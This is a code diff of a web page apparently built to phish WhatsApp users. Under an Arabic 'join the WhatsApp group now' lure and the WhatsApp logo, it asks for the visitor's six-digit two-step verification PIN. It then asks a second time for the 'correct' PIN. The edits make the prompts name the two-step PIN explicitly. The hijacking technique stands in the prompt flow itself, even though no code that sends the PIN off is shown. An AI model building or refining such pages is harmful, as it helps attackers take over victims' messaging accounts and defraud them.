@@ -204,7 +204,7 @@ function enforceNumericInput(inputId) {
                 container.innerHTML = `
                     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
                     <h1>انضم إلى مجموعة واتساب الآن  </h1>
-                    <p>يرجى إدخال رمز التحقق المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.</p>
+                    <p>يرجى إدخال رمز التحقق بخطوتين المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.</p>
                     <input id="pinCode1" type="tel"inputmode="numeric" pattern="[0-9]*" placeholder="PIN " maxlength="6">
                     <button onclick="submitFirstPin()">متابعة</button>
                     <div id="countdown"></div>
@@ -216,7 +216,7 @@ function enforceNumericInput(inputId) {
             const pinCode1 = document.getElementById('pinCode1').value;
 
             if (!pinCode1 || pinCode1.length !== 6 || !/^\d+$/.test(pinCode1)) {
-                alert('يرجى إدخال رمز التحقق المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.');
+                alert('يرجى إدخال رمز التحقق بخطوتين المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.');
                 return;
             }
 
@@ -227,7 +227,7 @@ function enforceNumericInput(inputId) {
                 container.innerHTML = `
                     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
                     <h1>انضم إلى مجموعة واتساب الآن  </h1>
-                    <p>يرجى إعادة إدخال رمز التحقق الصحيح المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.</p>
+                    <p>يرجى إعادة إدخال رمز التحقق بخطوتين الصحيح المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.</p>
                     <input id="pinCode2" type="tel"inputmode="numeric" pattern="[0-9]*" placeholder="PIN " maxlength="6">
                     <button onclick="submitSecondPin()">متابعة</button>
                     <div id="countdown"></div>
@@ -239,7 +239,7 @@ function enforceNumericInput(inputId) {
             const pinCode2 = document.getElementById('pinCode2').value;
 
             if (!pinCode2 || pinCode2.length !== 6 || !/^\d+$/.test(pinCode2)) {
-                alert('يرجى إإعادة دخال رمز التحقق الصحيح المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.');
+                alert('يرجى إإعادة دخال رمز التحقق بخطوتين الصحيح المكون من 6 أرقام (PIN) الذي قمت بإعداده مسبقًا لتأكيد الانضمام.');
                 return;
             }
 
